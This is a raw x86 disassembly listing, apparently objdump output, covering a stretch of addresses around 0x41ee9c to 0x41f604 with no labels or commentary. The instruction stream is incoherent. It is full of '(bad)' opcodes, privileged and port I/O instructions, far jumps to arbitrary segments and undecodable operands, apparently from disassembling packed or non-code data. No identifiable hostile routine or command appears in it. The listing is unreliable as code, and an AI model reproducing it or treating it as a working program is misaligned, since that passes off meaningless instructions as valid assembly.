  41ee9c:	mov    al,0xaa
  41ee9e:	stos   DWORD PTR es:[edi],eax
  41ee9f:	jmp    0x97f2:0x3fb9c38
  41eea6:	hlt    
  41eea7:	sub    BYTE PTR [eax+0x234ee80],dh
  41eead:	sbb    bh,ah
  41eeaf:	cs retf 
  41eeb1:	nop    DWORD PTR [edx+0x44]
  41eeb5:	mov    bl,0xe2
  41eeb7:	pop    ebx
  41eeb8:	mov    ebp,0xcfbd02cd
  41eebd:	(bad)  
  41eebe:	out    0x96,al
  41eec0:	in     eax,dx
  41eec1:	jg     0x41ee77
  41eec3:	sbb    al,0x89
  41eec5:	rol    dh,1
  41eec7:	cwde   
  41eec8:	das    
  41eec9:	xchg   ecx,eax
  41eeca:	shr    DWORD PTR [eax-0x168ff3f1],1
  41eed0:	retf   0x17c0
  41eed3:	in     al,0xc9
  41eed5:	or     BYTE PTR [ebp-0xc439026],0xac
  41eedc:	mov    WORD PTR [eax],?
  41eede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eedf:	fistp  DWORD PTR [edi]
  41eee1:	cli    
  41eee2:	xor    eax,0xbbee7784
  41eee7:	popf   
  41eee8:	fidiv  WORD PTR [ecx+0x76f00ccb]
  41eeee:	in     eax,dx
  41eeef:	cmp    al,0xb2
  41eef1:	rcr    BYTE PTR [ebx+0x18],1
  41eef4:	imul   edx,DWORD PTR [ecx],0x6b
  41eef7:	loop   0x41ee95
  41eef9:	push   0xc4fbdecd
  41eefe:	push   edi
  41eeff:	hlt    
  41ef00:	dec    eax
  41ef01:	rcl    DWORD PTR [ebp+0x79b51b4e],1
  41ef07:	add    al,0xd7
  41ef09:	imul   edi,esi,0xffffffb1
  41ef0c:	loopne 0x41ef21
  41ef0e:	adc    edi,esp
  41ef10:	mov    ah,0xb5
  41ef12:	popf   
  41ef13:	xchg   edx,eax
  41ef14:	mov    dl,BYTE PTR [edi]
  41ef16:	sub    dh,dh
  41ef18:	icebp  
  41ef19:	fmul   DWORD PTR [edx-0x324ce8b7]
  41ef1f:	pop    edi
  41ef20:	shr    BYTE PTR [ebp+ebx*8+0x4cf611af],0x93
  41ef28:	mov    ds:0x8c011b6,eax
  41ef2d:	stc    
  41ef2e:	pop    ebx
  41ef2f:	fbld   TBYTE PTR [edx]
  41ef31:	mov    bl,0xc7
  41ef33:	cmp    eax,0x14f8cd9b
  41ef38:	fimul  WORD PTR [esi]
  41ef3a:	(bad)  
  41ef3b:	jg     0x41efb5
  41ef3d:	cdq    
  41ef3e:	cs dec esp
  41ef40:	dec    eax
  41ef41:	in     al,dx
  41ef42:	enter  0xf84e,0xe6
  41ef46:	push   0x13
  41ef48:	(bad)  
  41ef49:	mov    ebx,0x71dc91d0
  41ef4e:	int    0x73
  41ef50:	out    0xa2,eax
  41ef52:	scas   eax,DWORD PTR es:[edi]
  41ef53:	dec    esp
  41ef54:	mov    cs,WORD PTR [esi-0x26dc4cbb]
  41ef5a:	cli    
  41ef5b:	cld    
  41ef5c:	jbe    0x41ef64
  41ef5e:	pop    ecx
  41ef5f:	lods   eax,DWORD PTR ds:[esi]
  41ef60:	cli    
  41ef61:	aas    
  41ef62:	mov    ds:0x2d43064,al
  41ef67:	xchg   BYTE PTR [ebx],al
  41ef69:	sbb    eax,0x1ee2c158
  41ef6e:	retf   
  41ef6f:	scas   eax,DWORD PTR es:[edi]
  41ef70:	sub    ebp,DWORD PTR [edi+0x62]
  41ef73:	add    eax,0xa88bd954
  41ef78:	(bad)  
  41ef79:	xchg   ebx,eax
  41ef7a:	icebp  
  41ef7b:	mov    al,ds:0x5277b691
  41ef80:	push   cs
  41ef81:	(bad)  
  41ef82:	imul   ebp,DWORD PTR [eax],0xed97ff2e
  41ef88:	lds    edx,FWORD PTR [ebx]
  41ef8a:	cmp    dh,BYTE PTR [ecx+0x24]
  41ef8d:	cmp    edi,DWORD PTR [ebx-0x14c6eb2c]
  41ef93:	idiv   BYTE PTR [edi-0x17]
  41ef96:	xor    bh,BYTE PTR [ecx+0x7c]
  41ef99:	fnstcw WORD PTR [ebp-0x4b]
  41ef9c:	stos   BYTE PTR es:[edi],al
  41ef9d:	imul   esi,DWORD PTR [esp+eiz*8],0x3e
  41efa1:	pusha  
  41efa2:	lods   al,BYTE PTR ds:[esi]
  41efa3:	repz jae 0x41ef63
  41efa6:	dec    esp
  41efa7:	lods   al,BYTE PTR ds:[esi]
  41efa8:	jle    0x41eff1
  41efaa:	aaa    
  41efab:	loope  0x41efa8
  41efad:	dec    ecx
  41efae:	ret    
  41efaf:	adc    eax,0xc59fdf16
  41efb4:	lds    esi,FWORD PTR [ebx]
  41efb6:	es mov ecx,0x983f20c6
  41efbc:	stos   DWORD PTR es:[edi],eax
  41efbd:	cmp    ecx,DWORD PTR [bx+0x46]
  41efc1:	dec    eax
  41efc2:	mov    esi,0x843df1ca
  41efc7:	loop   0x41f035
  41efc9:	loop   0x41effd
  41efcb:	mul    DWORD PTR [ebx]
  41efcd:	leave  
  41efce:	pop    ebx
  41efcf:	sub    ebp,0x2c
  41efd2:	xchg   ecx,eax
  41efd3:	xchg   esi,eax
  41efd4:	retf   0xac68
  41efd7:	das    
  41efd8:	call   esi
  41efda:	xchg   esi,eax
  41efdb:	cmp    al,0x4c
  41efdd:	xor    edx,DWORD PTR [esi-0x6a]
  41efe0:	adc    BYTE PTR [esi+0x7d],ch
  41efe3:	mov    esp,0x9054bc8d
  41efe8:	rol    BYTE PTR [ebx],cl
  41efea:	rcr    DWORD PTR [edi],0x51
  41efed:	aad    0x7a
  41efef:	dec    ebp
  41eff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eff1:	shl    DWORD PTR [esi+0x3c735ff1],1
  41eff7:	sbb    al,0xfc
  41eff9:	push   ss
  41effa:	je     0x41ef89
  41effc:	lock lods eax,DWORD PTR ds:[esi]
  41effe:	push   ss
  41efff:	xchg   ecx,eax
  41f000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f001:	cdq    
  41f002:	jmp    0xef10:0x5018692b
  41f009:	mov    ebx,0x603d815b
  41f00e:	shl    DWORD PTR [ecx+0x5fd78c74],1
  41f014:	ret    0x349
  41f017:	int3   
  41f018:	ror    edx,cl
  41f01a:	iret   
  41f01b:	addr16 imul ecx,edi,0x9171376d
  41f022:	shr    BYTE PTR [edi+eiz*2+0x5149c3a7],1
  41f029:	add    al,0xb5
  41f02b:	leave  
  41f02c:	daa    
  41f02d:	inc    ecx
  41f02e:	pop    DWORD PTR [edx-0x63b08ef6]
  41f034:	jg     0x41f033
  41f036:	lods   eax,DWORD PTR ds:[esi]
  41f037:	push   ss
  41f038:	loope  0x41f00a
  41f03a:	sub    ah,cl
  41f03c:	outs   dx,DWORD PTR ds:[esi]
  41f03d:	mov    esp,0x86cd1d09
  41f042:	ror    bl,cl
  41f044:	push   cs
  41f045:	mov    ebp,0x4fc260c
  41f04a:	mov    edx,0x15aa4dce
  41f04f:	mov    ah,0xc0
  41f051:	add    eax,0xe9f882b
  41f056:	out    0xc0,eax
  41f058:	push   ds
  41f059:	inc    ebx
  41f05a:	push   ebx
  41f05b:	loope  0x41f097
  41f05d:	push   0xffffffe9
  41f05f:	cmp    DWORD PTR ds:0x17a56356,esi
  41f065:	mov    bh,0x38
  41f067:	jmp    0xa8eeac38
  41f06c:	dec    ebx
  41f06d:	push   0xdd53c948
  41f072:	cld    
  41f073:	jmp    0xa3db2e17
  41f078:	add    al,0xf3
  41f07a:	bound  ecx,QWORD PTR [ecx+0x2]
  41f07d:	add    ah,BYTE PTR [ebx]
  41f07f:	bnd jg 0x41f094
  41f082:	inc    esp
  41f083:	mov    esp,DWORD PTR [edi-0x3f]
  41f086:	ds (bad) 
  41f088:	stos   DWORD PTR es:[edi],eax
  41f089:	add    edx,DWORD PTR [ebp-0x39dbc392]
  41f08f:	sbb    al,ah
  41f091:	icebp  
  41f092:	pop    esi
  41f093:	and    al,0x82
  41f095:	lock or ecx,eax
  41f098:	adc    al,0x11
  41f09a:	or     al,0x7
  41f09c:	cmp    al,cl
  41f09e:	push   ebx
  41f09f:	sahf   
  41f0a0:	nop
  41f0a1:	mov    WORD PTR [eax],es
  41f0a3:	jmp    0xea5a:0xce5a57f
  41f0aa:	jle    0x41f04b
  41f0ac:	lods   al,BYTE PTR ds:[esi]
  41f0ad:	jb     0x41f122
  41f0af:	mov    eax,ds:0xbb6971fa
  41f0b4:	sbb    eax,0xd8b584bd
  41f0b9:	pop    es
  41f0ba:	(bad)  
  41f0bc:	mov    ebx,0x50ffec9c
  41f0c1:	stos   DWORD PTR es:[edi],eax
  41f0c2:	push   esi
  41f0c3:	dec    ecx
  41f0c4:	(bad)  
  41f0c5:	js     0x41f0f3
  41f0c7:	das    
  41f0c8:	add    al,0xa5
  41f0ca:	cs pop ecx
  41f0cc:	fwait
  41f0cd:	cmp    eax,0xd86e89f
  41f0d2:	xor    ebx,esi
  41f0d4:	pop    ds
  41f0d5:	cmp    eax,0x9b13a65e
  41f0da:	icebp  
  41f0db:	lahf   
  41f0dc:	xor    DWORD PTR [esi-0x42],edi
  41f0df:	fild   DWORD PTR [ebp+0x4f915e2c]
  41f0e5:	iret   
  41f0e6:	mov    esi,0xa8cb1579
  41f0eb:	sub    bh,BYTE PTR [edi]
  41f0ed:	ja     0x41f16a
  41f0ef:	cmp    eax,0x52d2b71f
  41f0f4:	stc    
  41f0f5:	out    0x9c,al
  41f0f7:	adc    BYTE PTR [ebx-0x72],dh
  41f0fa:	dec    eax
  41f0fb:	data16 rol BYTE PTR [eax+ebp*1-0x5819b8be],1
  41f103:	cld    
  41f104:	pop    ecx
  41f105:	xor    edx,DWORD PTR [eax]
  41f107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f108:	push   ss
  41f109:	mov    eax,ds:0x9c67920f
  41f10e:	pop    ebx
  41f10f:	jno    0x41f0c0
  41f111:	ficomp WORD PTR [edi+0x7592dd26]
  41f117:	dec    edx
  41f118:	jg     0x41f194
  41f11a:	addr16 test al,0xcd
  41f11d:	jmp    0x598b:0xd7a9f8d8
  41f124:	xchg   BYTE PTR [ebx],cl
  41f126:	jo     0x41f0d2
  41f128:	mov    eax,0x77fd2e3c
  41f12d:	out    dx,eax
  41f12e:	inc    esi
  41f12f:	leave  
  41f130:	test   BYTE PTR [edi+0x7ad4256e],0x7a
  41f137:	ins    DWORD PTR es:[edi],dx
  41f138:	dec    edi
  41f139:	pop    ebx
  41f13a:	scas   al,BYTE PTR es:[edi]
  41f13b:	add    DWORD PTR [edi-0xfea97a6],esp
  41f141:	jecxz  0x41f0d9
  41f143:	(bad)  
  41f144:	mov    edi,0xb3575470
  41f149:	xchg   edx,eax
  41f14a:	in     al,dx
  41f14b:	mov    eax,ds:0x111a090e
  41f150:	jnp    0x41f0d3
  41f152:	std    
  41f153:	jno    0x41f11f
  41f155:	fcmove st,st(5)
  41f157:	adc    dl,bh
  41f159:	call   0x1cf75159
  41f15e:	imul   ebp,DWORD PTR [ebx-0x415c8404],0xb1f1ad2e
  41f168:	mov    edx,0x78410da2
  41f16d:	xchg   ebp,eax
  41f16e:	xor    dh,BYTE PTR [edi+0x74611448]
  41f174:	pop    ecx
  41f175:	xor    DWORD PTR [esi],0xffffffcf
  41f178:	(bad)  
  41f179:	in     eax,dx
  41f17a:	adc    cl,bl
  41f17c:	popa   
  41f17d:	inc    ebx
  41f17e:	shr    ebx,0x41
  41f181:	das    
  41f182:	mov    WORD PTR [ebx+0x50],?
  41f185:	xchg   edi,eax
  41f186:	(bad)  
  41f187:	div    BYTE PTR [ebx+0x0]
  41f18a:	push   es
  41f18b:	in     eax,0x26
  41f18d:	scas   eax,DWORD PTR es:[edi]
  41f18e:	inc    edi
  41f18f:	mov    al,0x89
  41f191:	push   ecx
  41f192:	cmp    esp,DWORD PTR [eax+edx*4-0x667797de]
  41f199:	hlt    
  41f19a:	xor    bl,BYTE PTR [edi]
  41f19c:	repnz cmp esp,0x58aa5d6b
  41f1a3:	call   0x5e1c:0xf05685af
  41f1aa:	push   ebx
  41f1ab:	pop    eax
  41f1ac:	pushf  
  41f1ad:	fwait
  41f1ae:	jbe    0x41f1ac
  41f1b0:	pop    ss
  41f1b1:	xlat   BYTE PTR ds:[ebx]
  41f1b2:	cld    
  41f1b3:	or     BYTE PTR [ebp+0x46],ah
  41f1b6:	mov    bh,0xa3
  41f1b8:	sub    esi,0xbfffa1a9
  41f1be:	push   DWORD PTR [eax-0x49]
  41f1c1:	sbb    al,BYTE PTR [edi-0x13b39fa3]
  41f1c7:	push   cs
  41f1c8:	ins    BYTE PTR es:[edi],dx
  41f1c9:	pop    esp
  41f1ca:	in     al,dx
  41f1cb:	repz xor DWORD PTR [ecx-0x1d3f1b80],eax
  41f1d2:	mov    BYTE PTR [ecx+0x98547a2],ch
  41f1d8:	jb     0x41f18a
  41f1da:	cld    
  41f1db:	es fs dec esi
  41f1de:	mov    edx,0x2772d0c2
  41f1e3:	lock fild WORD PTR [ecx+0x7]
  41f1e7:	or     ah,BYTE PTR [edx-0x34]
  41f1ea:	fidivr WORD PTR [esi]
  41f1ec:	sar    DWORD PTR [eax+0xb],1
  41f1ef:	xchg   esi,eax
  41f1f0:	out    0xdd,al
  41f1f2:	popf   
  41f1f3:	sbb    edi,esp
  41f1f5:	xchg   ebx,eax
  41f1f6:	jno    0x41f1ac
  41f1f8:	loope  0x41f258
  41f1fa:	fst    st(0)
  41f1fc:	xchg   esi,eax
  41f1fd:	loope  0x41f263
  41f1ff:	mov    fs,WORD PTR [ebx-0x79]
  41f202:	sub    edi,DWORD PTR ds:0xd4a695ff
  41f208:	pop    edx
  41f209:	fimul  DWORD PTR cs:[eax+0x2]
  41f20d:	shr    DWORD PTR [ecx+ebp*4],1
  41f210:	pushf  
  41f211:	lods   eax,DWORD PTR ds:[esi]
  41f212:	mov    edi,0x904969a
  41f217:	jne    0x41f275
  41f219:	jmp    0x41f270
  41f21b:	and    BYTE PTR [ecx],0x7b
  41f21e:	jge    0x41f1f1
  41f220:	mov    DWORD PTR [edx],ecx
  41f222:	push   ebp
  41f223:	icebp  
  41f224:	mov    ds:0xb13ea136,eax
  41f229:	xor    DWORD PTR [ebx],ebp
  41f22b:	cdq    
  41f22c:	dec    edx
  41f22d:	inc    ecx
  41f22e:	push   edi
  41f22f:	or     eax,0xfa551410
  41f234:	fnstcw WORD PTR [esi+0x2b6ef55b]
  41f23a:	push   ds
  41f23b:	icebp  
  41f23c:	jp     0x41f2b6
  41f23e:	mov    WORD PTR [edi-0x57170a5a],?
  41f244:	mov    ?,WORD PTR [ecx]
  41f246:	push   ds
  41f247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f248:	iret   
  41f249:	dec    ebp
  41f24a:	sub    al,0x19
  41f24c:	sbb    DWORD PTR [edi],esi
  41f24e:	mov    eax,0xd270bb40
  41f253:	lods   eax,DWORD PTR ds:[esi]
  41f254:	pop    eax
  41f255:	lock xor dl,0x49
  41f259:	lock cmp eax,0x8d56c8ca
  41f25f:	fstp   QWORD PTR [esi+0x58]
  41f262:	jecxz  0x41f294
  41f264:	scas   al,BYTE PTR es:[edi]
  41f265:	or     edi,0x4c
  41f268:	int3   
  41f269:	and    dl,0x76
  41f26c:	jge    0x41f2b1
  41f26e:	jp     0x41f1fc
  41f270:	xchg   edi,eax
  41f271:	push   eax
  41f272:	adc    ecx,DWORD PTR [edx]
  41f274:	mov    esp,DWORD PTR [ebx+0x76447fb4]
  41f27a:	mov    dh,0x25
  41f27c:	enter  0xeaa,0xcc
  41f280:	dec    eax
  41f281:	neg    DWORD PTR [edi-0x28d2f6cd]
  41f287:	push   cs
  41f288:	test   DWORD PTR [edx-0x47a83de7],edi
  41f28e:	ret    
  41f28f:	mov    ebp,0xda30483d
  41f294:	sub    BYTE PTR [ecx],ch
  41f296:	sub    al,0x43
  41f298:	ins    BYTE PTR es:[edi],dx
  41f299:	xor    eax,0x39723c1f
  41f29e:	pop    esp
  41f29f:	xlat   BYTE PTR ds:[ebx]
  41f2a0:	push   ds
  41f2a1:	mov    eax,ds:0xf4b05423
  41f2a6:	mov    cl,BYTE PTR [eax-0x71]
  41f2a9:	xchg   BYTE PTR [ecx+ebp*2+0x4d],dl
  41f2ad:	loop   0x41f318
  41f2af:	sbb    BYTE PTR [ecx+0x3132e2d2],dh
  41f2b5:	or     DWORD PTR [esi-0x11bd928f],0xa8668166
  41f2bf:	jg     0x41f311
  41f2c1:	in     al,dx
  41f2c2:	bound  eax,QWORD PTR [ecx]
  41f2c4:	sub    dl,BYTE PTR [edx-0x543abf7b]
  41f2ca:	and    eax,0x23f3510
  41f2cf:	arpl   WORD PTR [ebp+0x6b],si
  41f2d2:	scas   eax,DWORD PTR es:[edi]
  41f2d3:	popa   
  41f2d4:	ss scas eax,DWORD PTR es:[edi]
  41f2d6:	fisttp DWORD PTR [ecx-0x36]
  41f2d9:	(bad)  
  41f2da:	inc    ecx
  41f2db:	mov    dh,BYTE PTR [ecx]
  41f2dd:	(bad)  
  41f2de:	into   
  41f2df:	jg     0x41f2e6
  41f2e1:	adc    BYTE PTR [edx+0x53a75d0a],dh
  41f2e7:	mov    WORD PTR [edx-0x3b],ss
  41f2ea:	aaa    
  41f2eb:	pop    ecx
  41f2ec:	fs push 0x3b
  41f2ef:	hlt    
  41f2f0:	loop   0x41f2d2
  41f2f2:	xchg   esi,eax
  41f2f3:	pop    ds
  41f2f4:	or     al,0xdb
  41f2f6:	or     ch,BYTE PTR [eax-0x30]
  41f2f9:	outs   dx,DWORD PTR ds:[esi]
  41f2fa:	gs mov dl,0x32
  41f2fd:	adc    BYTE PTR [esi],0x46
  41f300:	or     al,0x4f
  41f302:	outs   dx,BYTE PTR ds:[esi]
  41f303:	jg     0x41f33d
  41f305:	add    al,0xfa
  41f307:	or     edx,DWORD PTR [eax+0x780f8a1e]
  41f30d:	scas   eax,DWORD PTR es:[edi]
  41f30e:	out    0x37,eax
  41f310:	dec    ecx
  41f311:	fidiv  WORD PTR [eax+0x73]
  41f314:	dec    ebx
  41f315:	out    0x60,eax
  41f317:	gs rcr eax,cl
  41f31a:	adc    eax,eax
  41f31c:	xor    eax,DWORD PTR [ecx+0x66fa59e]
  41f322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f323:	cmp    BYTE PTR [edi-0x52],0xed
  41f327:	sahf   
  41f328:	pushf  
  41f329:	sbb    cl,BYTE PTR [eax-0x5a0d743a]
  41f32f:	sub    ah,BYTE PTR [ecx-0x3deaad9]
  41f335:	sti    
  41f336:	push   eax
  41f337:	xor    ebp,DWORD PTR [ecx]
  41f339:	out    0xcc,eax
  41f33b:	mov    eax,0x55f40c3c
  41f340:	daa    
  41f341:	enter  0x9013,0x35
  41f345:	push   ecx
  41f346:	scas   eax,DWORD PTR es:[edi]
  41f347:	mul    BYTE PTR [ecx]
  41f349:	inc    ecx
  41f34a:	mov    BYTE PTR [eax+0xb],ah
  41f34d:	inc    eax
  41f34e:	adc    esi,DWORD PTR [ebx+0x6a13e537]
  41f354:	imul   ebp,esi,0x43
  41f357:	inc    edx
  41f358:	push   0x3a
  41f35a:	xor    DWORD PTR [ebx],ecx
  41f35c:	fwait
  41f35d:	in     al,dx
  41f35e:	jp     0x41f324
  41f360:	sbb    eax,0xd0009f16
  41f365:	mov    cl,0x8e
  41f367:	and    BYTE PTR [eax+0x37],al
  41f36a:	dec    esp
  41f36b:	sar    DWORD PTR [ebx-0x1],1
  41f36e:	and    DWORD PTR [ebx+ecx*8],eax
  41f371:	aas    
  41f372:	mov    cr1,ebx
  41f375:	(bad)  
  41f376:	mov    dh,0xe2
  41f378:	mov    ch,BYTE PTR [ebx+ebx*1+0x41]
  41f37c:	adc    DWORD PTR [ebp+eiz*2-0x51],ecx
  41f380:	je     0x41f3bd
  41f382:	sub    BYTE PTR [ebx+edi*8-0x28],dh
  41f386:	fisttp WORD PTR [esi-0x7eab19a9]
  41f38c:	sub    eax,0xc97a71a6
  41f391:	nop
  41f392:	mov    bl,0x85
  41f394:	call   0x558e78a3
  41f399:	or     edi,DWORD PTR [eax]
  41f39b:	pushf  
  41f39c:	mov    dh,0x86
  41f39e:	dec    esp
  41f39f:	xchg   DWORD PTR [eax+0x41],esp
  41f3a2:	jmp    0x41f416
  41f3a4:	dec    edi
  41f3a5:	rol    esp,cl
  41f3a7:	mov    ds:0x3816f395,eax
  41f3ac:	fsubr  QWORD PTR [eax]
  41f3ae:	bound  esi,QWORD PTR [esi+0x5f]
  41f3b1:	lock mov eax,ds:0x16a1069b
  41f3b7:	stos   DWORD PTR es:[edi],eax
  41f3b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3b9:	fs enter 0x8ee1,0x66
  41f3be:	adc    bl,BYTE PTR [ebp-0x70be3e9d]
  41f3c4:	mov    ebp,0x3e9b0749
  41f3c9:	pop    ebp
  41f3ca:	(bad)  
  41f3cb:	out    0x29,eax
  41f3cd:	rcl    ecx,1
  41f3cf:	add    BYTE PTR ds:0x48594dd4,ch
  41f3d5:	call   0xa642:0x90e92269
  41f3dc:	push   edx
  41f3dd:	inc    ecx
  41f3de:	xchg   DWORD PTR [ebx+0x6d],esi
  41f3e1:	adc    bh,ah
  41f3e3:	sub    ch,BYTE PTR [edi+ebx*8+0xf446cb1]
  41f3ea:	sbb    DWORD PTR [esi-0x9],ebx
  41f3ed:	sti    
  41f3ee:	mov    DWORD PTR [edi+0x2f0fe664],ebp
  41f3f4:	push   ecx
  41f3f5:	neg    BYTE PTR [edi-0x294a4a51]
  41f3fb:	stos   DWORD PTR es:[edi],eax
  41f3fc:	gs out dx,eax
  41f3fe:	std    
  41f3ff:	dec    edi
  41f400:	sbb    bh,BYTE PTR [eax+eax*8-0x24aba908]
  41f407:	pop    esp
  41f408:	xor    BYTE PTR [edi+ebp*1-0x52859832],cl
  41f40f:	xlat   BYTE PTR ds:[ebx]
  41f410:	stc    
  41f411:	imul   edx,DWORD PTR [esi+0x41],0xb7835ac9
  41f418:	jle    0x41f472
  41f41a:	leave  
  41f41b:	sbb    esi,DWORD PTR [edi+0x7c757096]
  41f421:	adc    al,0xbc
  41f423:	retfw  0xfa99
  41f427:	cdq    
  41f428:	clc    
  41f429:	fisubr DWORD PTR [esi-0xb]
  41f42c:	jae    0x41f4aa
  41f42e:	adc    ebp,ebx
  41f430:	mov    ss,ebx
  41f432:	pop    edx
  41f433:	jp     0x41f417
  41f435:	pop    edx
  41f436:	(bad)  [edx-0x48]
  41f439:	dec    ecx
  41f43a:	pusha  
  41f43b:	scas   al,BYTE PTR es:[edi]
  41f43c:	call   0x3e62:0x9fbed8cc
  41f443:	xor    bl,ah
  41f445:	(bad)  
  41f446:	ds ret 0x8952
  41f44a:	in     eax,0x47
  41f44c:	or     DWORD PTR [ebp-0x7d],edx
  41f44f:	sti    
  41f450:	pop    ecx
  41f451:	push   ecx
  41f452:	sbb    esp,0xca97c63a
  41f458:	js     0x41f423
  41f45a:	add    BYTE PTR [esi-0x20b456b8],0xdd
  41f461:	ror    DWORD PTR [ecx],0x9f
  41f464:	cmp    edi,0x21
  41f467:	popa   
  41f468:	ins    DWORD PTR es:[edi],dx
  41f469:	mov    ebx,0xb86f941d
  41f46e:	test   BYTE PTR [edx+0x4c54398b],bl
  41f474:	les    sp,DWORD PTR [edx-0x74]
  41f478:	cmp    DWORD PTR [edx+0xe788798],eax
  41f47e:	cwde   
  41f47f:	lock (bad) 
  41f481:	mov    WORD PTR [esp+edi*4],?
  41f484:	lahf   
  41f485:	jne    0x41f418
  41f487:	aaa    
  41f488:	adc    al,BYTE PTR [edi]
  41f48a:	sub    eax,0xc1ea2b8c
  41f48f:	inc    eax
  41f490:	test   DWORD PTR [edx+0x21],edx
  41f493:	pusha  
  41f494:	dec    DWORD PTR [eax+ebx*4+0xa]
  41f498:	ins    BYTE PTR es:[edi],dx
  41f499:	xor    bh,BYTE PTR [esi+0x1ff45284]
  41f49f:	rcr    dh,cl
  41f4a1:	xchg   edx,eax
  41f4a2:	retf   0xa191
  41f4a5:	inc    edx
  41f4a6:	fldcw  WORD PTR [edi]
  41f4a8:	ja     0x41f4a7
  41f4aa:	inc    eax
  41f4ab:	adc    al,0xb2
  41f4ad:	jmp    0x3670:0x4df3ec7c
  41f4b4:	call   0x6908cf09
  41f4b9:	adc    DWORD PTR [ebx],esp
  41f4bb:	xor    esi,DWORD PTR [ecx+0x57]
  41f4be:	inc    ebp
  41f4bf:	jg     0x41f494
  41f4c1:	cmp    eax,ebp
  41f4c3:	pop    eax
  41f4c4:	inc    edi
  41f4c5:	mov    ds:0x4b0934be,al
  41f4ca:	sbb    BYTE PTR ds:0xc63232c0,dh
  41f4d0:	inc    ebp
  41f4d1:	and    cl,BYTE PTR [ebx]
  41f4d3:	sbb    al,0x6b
  41f4d5:	push   edi
  41f4d6:	xchg   esi,eax
  41f4d7:	ficom  WORD PTR [ebx-0x39]
  41f4da:	ja     0x41f4f6
  41f4dc:	cmp    ch,bl
  41f4de:	pop    ecx
  41f4df:	mov    DWORD PTR [eax],esp
  41f4e1:	(bad)  
  41f4e2:	aad    0x42
  41f4e4:	jbe    0x41f4a1
  41f4e6:	or     BYTE PTR [edi-0x72],cl
  41f4e9:	push   ebx
  41f4ea:	ss daa 
  41f4ec:	pop    ebp
  41f4ed:	adc    ebx,eax
  41f4ef:	icebp  
  41f4f0:	outs   dx,DWORD PTR ds:[esi]
  41f4f1:	aad    0x2b
  41f4f3:	neg    DWORD PTR [edx+ebx*2-0x24]
  41f4f7:	fdiv   st(5),st
  41f4f9:	pop    edx
  41f4fa:	ror    BYTE PTR ds:0x3b7baa5,1
  41f500:	mov    edx,0xb9cef755
  41f505:	(bad)  
  41f506:	or     DWORD PTR [esi-0x3e45c2ff],ecx
  41f50c:	into   
  41f50d:	xchg   ebx,eax
  41f50e:	les    eax,FWORD PTR [ecx]
  41f510:	arpl   WORD PTR [edi],dx
  41f512:	push   ebx
  41f513:	dec    BYTE PTR [ebp-0x31]
  41f516:	add    DWORD PTR ds:0x82899fa5,eax
  41f51c:	shr    al,0x4c
  41f51f:	call   0xebca:0xa1983bb9
  41f526:	retf   0x16c2
  41f529:	js     0x41f544
  41f52b:	fdivr  DWORD PTR [edi+0x73a1756c]
  41f531:	stos   DWORD PTR es:[edi],eax
  41f532:	pop    ds
  41f533:	and    BYTE PTR [ecx],ch
  41f535:	xor    ebx,DWORD PTR [ebx-0x53]
  41f538:	adc    eax,0x1d9f8a46
  41f53d:	xchg   ecx,eax
  41f53e:	fcmovbe st,st(0)
  41f540:	push   cs
  41f541:	or     BYTE PTR [ebx+0x27a73017],dl
  41f547:	loope  0x41f552
  41f549:	lods   al,BYTE PTR ds:[esi]
  41f54a:	(bad)
  41f54d:	cmp    ebp,esi
  41f54f:	imul   BYTE PTR [ebp+0x1922e8f2]
  41f555:	mov    eax,DWORD PTR [edx]
  41f557:	mov    BYTE PTR [ebp-0xc],dl
  41f55a:	push   ebp
  41f55b:	shl    BYTE PTR [eax+0x6fddd6cd],1
  41f561:	push   ecx
  41f562:	cmp    al,0xdc
  41f564:	jge    0x41f5e0
  41f566:	add    ebx,0x7ec8f3ce
  41f56c:	inc    esp
  41f56d:	in     al,dx
  41f56e:	jnp    0x41f5e2
  41f570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f571:	shl    BYTE PTR [ebx+0x3b],1
  41f574:	and    ecx,ebp
  41f576:	jmp    0xd51f8355
  41f57b:	mov    ch,0x3d
  41f57d:	and    eax,0xfa1311aa
  41f582:	mov    cl,0xde
  41f584:	or     BYTE PTR [edx-0x28ec1bdd],al
  41f58a:	jne    0x41f56f
  41f58c:	repnz xor ecx,edi
  41f58f:	in     al,dx
  41f590:	xor    DWORD PTR [ecx],esp
  41f592:	jge    0x41f5db
  41f594:	in     eax,0x92
  41f596:	fidiv  DWORD PTR [edi]
  41f598:	or     DWORD PTR [ebp+edi*2-0x6c70f1bd],edi
  41f59f:	xor    DWORD PTR ds:0x502fe159,edx
  41f5a5:	in     eax,dx
  41f5a6:	bts    DWORD PTR [eax+0x73],ebp
  41f5aa:	outs   dx,BYTE PTR ds:[esi]
  41f5ab:	aam    0x26
  41f5ad:	dec    edi
  41f5ae:	aaa    
  41f5af:	xor    eax,0xb8ef329d
  41f5b4:	loopne 0x41f549
  41f5b6:	cld    
  41f5b7:	call   edx
  41f5b9:	sub    eax,0x3e3e6c1b
  41f5be:	sub    DWORD PTR [edx-0x75],ebp
  41f5c1:	lods   eax,DWORD PTR ds:[esi]
  41f5c2:	push   es
  41f5c3:	call   0x3e18666c
  41f5c8:	sahf   
  41f5c9:	(bad)  
  41f5ca:	xlat   BYTE PTR ds:[ebx]
  41f5cb:	out    dx,eax
  41f5cc:	outs   dx,BYTE PTR ds:[esi]
  41f5cd:	jae    0x41f603
  41f5cf:	test   BYTE PTR [edi+0x375ddcfd],bl
  41f5d5:	cwde   
  41f5d6:	sbb    bh,BYTE PTR [ebp-0x2e44ae29]
  41f5dc:	mov    edx,esi
  41f5de:	or     BYTE PTR [edx],dh
  41f5e0:	push   ebx
  41f5e1:	mov    edx,0x23bb3bd3
  41f5e6:	pop    esi
  41f5e7:	sub    ebp,DWORD PTR [ebp-0x38]
  41f5ea:	jecxz  0x41f5a2
  41f5ec:	xor    eax,0xd92ec904
  41f5f1:	mov    ds:0x45907c9,al
  41f5f6:	out    dx,al
  41f5f7:	xor    bl,BYTE PTR [ebp-0x5]
  41f5fa:	inc    edi
  41f5fb:	sub    cl,BYTE PTR [ebp+0x79b34e11]
  41f601:	leave  
  41f602:	rol    BYTE PTR [esi],cl
  41f604:	ins    BYTE PTR es:[edi],dx
